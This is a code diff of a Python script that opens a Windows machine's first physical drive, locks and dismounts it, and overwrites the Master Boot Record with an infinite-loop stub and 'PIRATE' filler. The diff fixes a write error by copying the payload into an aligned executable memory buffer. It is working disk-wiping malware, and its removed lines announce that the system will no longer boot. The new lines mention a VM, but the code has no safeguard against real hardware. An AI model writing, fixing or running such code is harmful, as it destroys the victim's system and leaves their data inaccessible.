@@ -26,7 +26,6 @@ def elevate():
     )
 
 def enable_debug_privilege():
-    """Bypasses standard kernel filters by elevating to Debugger status."""
     try:
         hToken = win32security.OpenProcessToken(
             win32api.GetCurrentProcess(), 
@@ -49,10 +48,17 @@ def run():
     # 1. SETUP KERNEL32 BRIDGE
     dll = type('DLL', (), {})()
     dll.Kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
+    
+    # Define VirtualAlloc for hardware-aligned memory
+    dll.Kernel32.VirtualAlloc.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
+    dll.Kernel32.VirtualAlloc.restype = wintypes.LPVOID
+
     dll.Kernel32.CreateFileW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, wintypes.HANDLE]
     dll.Kernel32.CreateFileW.restype = wintypes.HANDLE
-    dll.Kernel32.WriteFile.argtypes = [wintypes.HANDLE, ctypes.c_void_p, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD), ctypes.c_void_p]
+    
+    dll.Kernel32.WriteFile.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID]
     dll.Kernel32.WriteFile.restype = wintypes.BOOL
+    
     dll.Kernel32.DeviceIoControl.argtypes = [wintypes.HANDLE, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID]
     dll.Kernel32.DeviceIoControl.restype = wintypes.BOOL
 
@@ -60,29 +66,32 @@ def run():
     hDevice = dll.Kernel32.CreateFileW(r'\\?\PhysicalDrive0', 0x40000000, 0x01 | 0x02, None, 3, 0, 0)
 
     if hDevice != wintypes.HANDLE(-1).value:
-        # Dismount for access
+        # Force Dismount
         dwBytesReturned = wintypes.DWORD(0)
-        # FSCTL_LOCK_VOLUME = 0x00090018, FSCTL_DISMOUNT_VOLUME = 0x00090020
         dll.Kernel32.DeviceIoControl(hDevice, 0x00090018, None, 0, None, 0, ctypes.byref(dwBytesReturned), None)
         dll.Kernel32.DeviceIoControl(hDevice, 0x00090020, None, 0, None, 0, ctypes.byref(dwBytesReturned), None)
         
-        # --- PREPARE SECTOR-ALIGNED PAYLOAD (Fixes Error 87) ---
-        # \xEB\xFE is x86 assembly for a jump-to-self infinite loop
-        raw_payload = b"\xEB\xFE" + b"PIRATE" * 10 
+        # 3. ALLOCATE AND PREPARE ALIGNED PAYLOAD
+        # 0x1000 = MEM_COMMIT, 0x40 = PAGE_EXECUTE_READWRITE
+        mem_ptr = dll.Kernel32.VirtualAlloc(None, 512, 0x1000, 0x40)
         
-        # Pad with null bytes to exactly 510 bytes, then add the 55AA signature
+        # Create our 512-byte MBR
+        raw_payload = b"\xEB\xFE" + b"PIRATE" * 10 
         mbr_payload = raw_payload.ljust(510, b"\x00") + b"\x55\xAA"
         
-        print(f"Payload size: {len(mbr_payload)} bytes (Sector Aligned)")
+        # Move the payload into the system-aligned memory block
+        ctypes.memmove(mem_ptr, mbr_payload, 512)
         
-        # --- OVERWRITE ---
+        print("Writing from aligned memory block...")
         written = wintypes.DWORD(0)
-        if dll.Kernel32.WriteFile(hDevice, mbr_payload, 512, ctypes.byref(written), None):
-            print("SUCCESS: MBR Overwritten. System will no longer boot.")
+        
+        # 4. EXECUTE WRITE
+        if dll.Kernel32.WriteFile(hDevice, mem_ptr, 512, ctypes.byref(written), None):
+            print(f"SUCCESS! Wrote {written.value} bytes to Sector 0.")
+            print("The drive is now overwritten. Reboot the VM to verify.")
         else:
-            print(f"Overwrite failed. Error: {ctypes.get_last_error()}")
-            print("Hint: Check if Windows Defender or Tamper Protection is active.")
-
+            print(f"Write failed. Error: {ctypes.get_last_error()}")
+            
         dll.Kernel32.CloseHandle(hDevice)
     else:
         print(f"Failed to open drive. Error: {ctypes.get_last_error()}")
